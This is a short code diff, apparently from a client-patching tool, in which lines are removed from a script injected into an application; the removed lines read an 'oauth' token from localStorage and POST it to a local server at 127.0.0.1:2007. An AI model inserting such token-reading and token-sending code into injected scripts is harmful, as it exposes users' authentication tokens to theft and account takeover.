@@ -253,15 +253,6 @@ class Patcher {
             
                     setInterval(updateTheme, 2000);
                 });
-                const token = localStorage.getItem("oauth"); 
-                fetch('http://127.0.0.1:2007/send_token', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: token,
-                });
-
                 `
 
                 fs.writeFileSync(rumScriptPath, rumScriptContent);
